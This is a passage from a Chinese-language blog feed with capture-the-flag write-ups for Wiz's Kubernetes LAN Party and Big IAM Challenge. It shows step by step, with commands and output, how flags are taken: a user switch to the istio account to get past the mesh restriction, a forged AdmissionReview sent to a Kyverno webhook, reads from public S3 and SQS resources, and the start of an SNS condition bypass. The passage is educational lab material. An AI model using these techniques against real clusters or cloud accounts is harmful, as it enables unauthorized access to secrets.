&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># su istio&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ id
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#f92672">=&lt;/span>1337&lt;span style="color:#f92672">(&lt;/span>istio&lt;span style="color:#f92672">)&lt;/span> gid&lt;span style="color:#f92672">=&lt;/span>1337&lt;span style="color:#f92672">(&lt;/span>istio&lt;span style="color:#f92672">)&lt;/span> groups&lt;span style="color:#f92672">=&lt;/span>1337&lt;span style="color:#f92672">(&lt;/span>istio&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wiz_k8s_lan_party&lt;span style="color:#f92672">{&lt;/span>only-leet-hex0rs-can-play-both-k8s-and-linux&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-3">思考&lt;/h3>
&lt;p>容器内避免使用root用户运行。&lt;/p>
&lt;h2 id="challenge-5-lateral-movement">Challenge 5: LATERAL MOVEMENT&lt;/h2>
&lt;h3 id="题目-4">题目&lt;/h3>
&lt;p>Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the &lt;a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">administrative&lt;/a> services.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">apiVersion&lt;/span>: &lt;span style="color:#ae81ff">kyverno.io/v1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">kind&lt;/span>: &lt;span style="color:#ae81ff">Policy&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">metadata&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">name&lt;/span>: &lt;span style="color:#ae81ff">apply-flag-to-env&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">namespace&lt;/span>: &lt;span style="color:#ae81ff">sensitive-ns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">spec&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">rules&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - &lt;span style="color:#f92672">name&lt;/span>: &lt;span style="color:#ae81ff">inject-env-vars&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">match&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">resources&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">kinds&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - &lt;span style="color:#ae81ff">Pod&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">mutate&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">patchStrategicMerge&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">spec&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">containers&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - &lt;span style="color:#f92672">name&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">env&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - &lt;span style="color:#f92672">name&lt;/span>: &lt;span style="color:#ae81ff">FLAG&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">value&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;{flag}&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="解题-4">解题&lt;/h3>
&lt;ol>
&lt;li>扫描&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ dnscan -subnet 10.100.0.1/16
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10.100.86.210 -&amp;gt; kyverno-cleanup-controller.kyverno.svc.cluster.local.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10.100.126.98 -&amp;gt; kyverno-svc-metrics.kyverno.svc.cluster.local.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10.100.158.213 -&amp;gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10.100.171.174 -&amp;gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10.100.217.223 -&amp;gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10.100.232.19 -&amp;gt; kyverno-svc.kyverno.svc.cluster.local.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>根据[administrative](&lt;a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request]">https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request]&lt;/a>，进行AdmissionReview&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl -k -X POST https://kyverno-svc.kyverno.svc.cluster.local./mutate -H &lt;span style="color:#e6db74">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> --data &lt;span style="color:#e6db74">&amp;#39;{&amp;#34;apiVersion&amp;#34;:&amp;#34;admission.k8s.io/v1&amp;#34;,&amp;#34;kind&amp;#34;:&amp;#34;AdmissionReview&amp;#34;,&amp;#34;request&amp;#34;:{&amp;#34;uid&amp;#34;:&amp;#34;12345678-1234-1234-1234-123456789012&amp;#34;,&amp;#34;kind&amp;#34;:{&amp;#34;group&amp;#34;:&amp;#34;&amp;#34;,&amp;#34;version&amp;#34;:&amp;#34;v1&amp;#34;,&amp;#34;kind&amp;#34;:&amp;#34;Pod&amp;#34;},&amp;#34;resource&amp;#34;:{&amp;#34;group&amp;#34;:&amp;#34;&amp;#34;,&amp;#34;version&amp;#34;:&amp;#34;v1&amp;#34;,&amp;#34;resource&amp;#34;:&amp;#34;pods&amp;#34;},&amp;#34;requestKind&amp;#34;:{&amp;#34;group&amp;#34;:&amp;#34;&amp;#34;,&amp;#34;version&amp;#34;:&amp;#34;v1&amp;#34;,&amp;#34;kind&amp;#34;:&amp;#34;Pod&amp;#34;},&amp;#34;requestResource&amp;#34;:{&amp;#34;group&amp;#34;:&amp;#34;&amp;#34;,&amp;#34;version&amp;#34;:&amp;#34;v1&amp;#34;,&amp;#34;resource&amp;#34;:&amp;#34;pods&amp;#34;},&amp;#34;namespace&amp;#34;:&amp;#34;sensitive-ns&amp;#34;,&amp;#34;operation&amp;#34;:&amp;#34;CREATE&amp;#34;,&amp;#34;object&amp;#34;:{&amp;#34;apiVersion&amp;#34;:&amp;#34;v1&amp;#34;,&amp;#34;kind&amp;#34;:&amp;#34;Pod&amp;#34;,&amp;#34;metadata&amp;#34;:{&amp;#34;name&amp;#34;:&amp;#34;example-pod&amp;#34;,&amp;#34;namespace&amp;#34;:&amp;#34;sensitive-ns&amp;#34;},&amp;#34;spec&amp;#34;:{&amp;#34;containers&amp;#34;:[{&amp;#34;name&amp;#34;:&amp;#34;example-container&amp;#34;,&amp;#34;image&amp;#34;:&amp;#34;nginx&amp;#34;,&amp;#34;env&amp;#34;:[{&amp;#34;name&amp;#34;:&amp;#34;FLAG&amp;#34;,&amp;#34;value&amp;#34;:&amp;#34;{flag}&amp;#34;}]}]}}}}&amp;#39;&lt;/span> | jq -r .response.patch | base64 -d | jq -r &lt;span style="color:#e6db74">&amp;#39;.[0].value&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wiz_k8s_lan_party&lt;span style="color:#f92672">{&lt;/span>you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-4">思考&lt;/h3>
&lt;p>避免在动态准入控制放置敏感信息。&lt;/p></content></item><item><title>Wiz Big Iam Challenge</title><link>/posts/2024/wiz-big-iam-challenge/</link><pubDate>Sat, 31 Aug 2024 13:08:52 +0800</pubDate><guid>/posts/2024/wiz-big-iam-challenge/</guid><description>&lt;img src="/img/2024/wiz-the-big-iam-challenge-cert.jpg" alt="Certificate" class="center" style="width:70%;" /></description><content>&lt;img src="/img/2024/wiz-the-big-iam-challenge-cert.jpg" alt="Certificate" class="center" style="width:70%;" />
&lt;h2 id="challenge-1-buckets-of-fun">Challenge 1: Buckets of Fun&lt;/h2>
&lt;h3 id="解题">解题&lt;/h3>
&lt;p>查看View IAM Policys&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Version&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;2012-10-17&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Statement&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Effect&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Allow&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Principal&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Action&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;s3:GetObject&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Resource&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Effect&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Allow&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Principal&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Action&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;s3:ListBucket&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Resource&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Condition&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;StringLike&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;s3:prefix&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;files/*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个策略包含两个声明：&lt;/p>
&lt;ol>
&lt;li>第一个声明允许所有用户对存储桶 thebigiamchallenge-storage-9979f4b 中的所有对象执行 s3:GetObject 操作。&lt;/li>
&lt;li>第二个声明允许所有用户对存储桶 thebigiamchallenge-storage-9979f4b 执行 s3:ListBucket 操作，但仅限于前缀为 files/ 的对象。&lt;/li>
&lt;/ol>
&lt;p>列出指定 S3 存储桶中的全部对象&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws s3api list-objects-v2 --bucket thebigiamchallenge-storage-9979f4b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Contents&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Key&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;files/flag1.txt&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LastModified&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2023-06-05T19:13:53.000Z&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;ETag&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;\&amp;#34;ee004573d2858ed66abf17d58d350b97\&amp;#34;&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Size&amp;#34;&lt;/span>: 37,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;StorageClass&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;STANDARD&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Key&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;files/logo.png&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LastModified&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2023-06-08T19:18:24.000Z&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;ETag&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;\&amp;#34;c57e95e6d6c138818bf38daac6216356\&amp;#34;&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Size&amp;#34;&lt;/span>: 81889,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;StorageClass&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;STANDARD&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过将文件内容输出至stdout中获得flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>wiz:exposed-storage-risky-as-usual&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考">思考&lt;/h3>
&lt;p>该策略的设置对于用户权限过于宽泛，是一种常见且不够严谨的配置方式。&lt;/p>
&lt;h2 id="challenge-2-google-analytics">Challenge 2: &lt;del>Google&lt;/del> Analytics&lt;/h2>
&lt;h3 id="解题-1">解题&lt;/h3>
&lt;p>查看View IAM Policys&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Version&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;2012-10-17&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Statement&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Effect&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Allow&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Principal&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Action&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;sqs:SendMessage&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;sqs:ReceiveMessage&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Resource&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个策略包含一个声明，允许所有用户对指定的 SQS 队列执行发送消息 (sqs:SendMessage)、接收消息 (sqs:ReceiveMessage)操作：&lt;/p>
&lt;p>执行接收消息操作&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Messages&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;MessageId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;3f8a25dd-868d-4f86-af00-4f21739d2100&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;ReceiptHandle&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;AQEBECzaPPWrRTu0F/n2VYwTkW/iwwk2hBrVviXIafMb5T5uO7fQaPQb/RStX7R3p/aPBjvZqWAWwxtsWnBoBxSvWECsYVr88XLr0ceD5WaY47CAUUM1APqoJP304E9WhXCgXx0vTysWJR7srn
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">ooL2xApHvLhO1+8IpDVJgI2GYrGu+7SNdrIHx2tTpQ726tbPlXOMgsND+Cn02Gta7LyNGT33Wvy2NVjf1srTmmCNq1A+rl2qtkz0Eo/c45ZgTuOJNir0xK122zMpoUIIS62rVKFatLbDhr0HnjXUFFFDyImtI3V3glSU5I7KRlvTsTUf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">TMWA47MdPwypVZzQQe5GS0eI0wP+wJiR3iNehKORdrMvpaJfeLZuhKyEIG2jILHlK383G4m8Yntsq+uRV6/i2/tEU06fcH0nalJ8qaIzd9GPs=&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;MD5OfBody&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;4cb94e2bb71dbd5de6372f7eaea5c3fd&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Body&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;{\&amp;#34;URL\&amp;#34;: \&amp;#34;https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\&amp;#34;, \&amp;#34;User-Agent\&amp;#34;: \&amp;#34;Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">/1.4.3714\&amp;#34;, \&amp;#34;IsAdmin\&amp;#34;: true}&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>访问Body字段内容的URL(&lt;a href="https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html">https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html&lt;/a>)，即可获得flag&lt;/p>
&lt;h3 id="思考-1">思考&lt;/h3>
&lt;p>该策略的设置对于用户权限过于宽泛，且SQS队列内包含敏感信息的载体。&lt;/p>
&lt;h2 id="challenge-3-enable-push-notifications">Challenge 3: Enable Push Notifications&lt;/h2>
&lt;h3 id="解题-2">解题&lt;/h3>
&lt;p>查看View IAM Policys&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Version&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;2008-10-17&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Id&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Statement1&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Statement&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Sid&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Statement1&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Effect&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Allow&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Principal&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;AWS&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Action&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;SNS:Subscribe&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Resource&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Condition&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;StringLike&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;sns:Endpoint&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;*@tbic.wiz.io&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个策略包含一个声明，允许所有 AWS 账户对指定的 SNS 主题执行订阅(SNS:Subscribe)操作，但仅限于符合特定条件(*@tbic.wiz.io)的终端节点(参考 &lt;a href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html">AWS Doc&lt;/a>)
根据&lt;a href="https://docs.aws.amazon.com/zh_cn/sns/latest/dg/sns-create-subscribe-endpoint-to-topic.html">AWS Doc&lt;/a>，SNS 终端节点支持多种类型。在这种情况下，可以使用 HTTP/HTTPS 进行条件绕过。&lt;/p>
&lt;p>在具有公网的服务器上使用python3 http.server 建立一个 HTTP 服务器来监听@tbic.wiz.io请求路径，并且存储为custom_server.py&lt;/p>
